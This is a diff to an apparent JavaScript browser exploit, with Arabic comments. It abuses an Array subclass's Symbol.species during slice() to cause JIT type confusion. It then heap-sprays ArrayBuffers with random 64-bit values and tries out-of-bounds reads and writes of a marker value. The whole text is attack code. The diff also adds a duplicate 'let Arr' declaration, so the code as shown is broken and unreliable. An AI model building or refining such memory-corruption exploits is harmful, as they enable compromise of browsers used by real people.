@@ -352,22 +352,23 @@ function main() {
 main();
 */
 
-
 let Trigger = false;
 let Arr = null;
-let ab = new ArrayBuffer(0x4000); // زيادة الحجم لتخزين المزيد
-let y = new BigUint64Array(ab); // دعم 64-bit
+let ab = new ArrayBuffer(0x4000); // زيادة الحجم
+let y = new BigUint64Array(ab); // دعم 64-bit للقراءة
+let arrBuffer = new ArrayBuffer(0x4000); // بافر جديد لـ Arr
+let Arr = new BigUint64Array(arrBuffer); // استخدام BigUint64Array لـ Arr
 
 function Target(Special, Idx, Value) {
     try {
-        Arr.fill(4e-324); // تهيئة
+        Arr.fill(0n); // تهيئة بـ BigInt صفر
         Special.slice();
-        Arr[Idx] = Value; // كتابة القيمة
-        y[0] = BigInt(Arr[Idx]); // قراءة إلى 64-bit
+        Arr[Idx] = Value; // كتابة القيمة 64-bit
+        y[0] = Arr[Idx]; // قراءة إلى y
         if (Idx === 0x20 && Trigger) {
-            //alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
+            alert(`Trigger hit at ${Idx.toString(16)}, y[0] = ${y[0].toString(16)}`);
         }
-        //alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
+        alert(`Target called, Arr[${Idx.toString(16)}] = ${Arr[Idx].toString(16)}, y[0] = ${y[0].toString(16)}`);
     } catch (e) {
         alert(`Error at Idx ${Idx.toString(16)}: ${e.message}`);
     }
@@ -377,14 +378,14 @@ class SoSpecial extends Array {
     static get [Symbol.species]() {
         return function() {
             if (Trigger) {
-                Arr.length = 0;
+                Arr = new BigUint64Array(arrBuffer); // إعادة تهيئة Arr
                 let sprayAb = new ArrayBuffer(0x100);
-                let sprayView = new Uint32Array(sprayAb);
+                let sprayView = new BigUint64Array(sprayAb);
                 for (let i = 0; i < sprayView.length; i++) {
-                    sprayView[i] = BigInt(Math.floor(Math.random() * 0x100000000)); // قيم عشوائية
+                    sprayView[i] = BigInt(Math.floor(Math.random() * Number.MAX_SAFE_INTEGER)) << 32n | BigInt(Math.floor(Math.random() * Number.MAX_SAFE_INTEGER)); // قيم عشوائية 64-bit
                 }
                 let spray = new Array(0x1000).fill(sprayAb); // تكرار
-                alert("Heap sprayed with random values");
+                alert("Heap sprayed with random 64-bit values");
             }
         };
     }
@@ -392,7 +393,7 @@ class SoSpecial extends Array {
 
 function readMemory(Idx) {
     try {
-        y[0] = BigInt(Arr[Idx] || 0n); // قراءة القيمة الحالية دون كتابة
+        y[0] = Arr[Idx] || 0n; // قراءة القيمة الحالية
         alert(`Read at ${Idx.toString(16)}: ${y[0].toString(16)}`);
         return y[0];
     } catch (e) {
@@ -404,10 +405,9 @@ function readMemory(Idx) {
 function main() {
     try {
         const Snowflake = new SoSpecial();
-        Arr = new Array(0x21);
-        Arr.fill(0);
+        Arr.fill(0n); // تهيئة أولية
         for (let Idx = 0; Idx < 0x400; Idx++) {
-            Target(Snowflake, 0, 5e-324);
+            Target(Snowflake, 0, 0n); // استخدام 0n بدلاً من 5e-324
         }
         Trigger = true;
         let qwordValue = 0x44332211deadbeefn; // قيمة 64-bit
@@ -424,3 +424,4 @@ function main() {
 }
 
 main();
+    
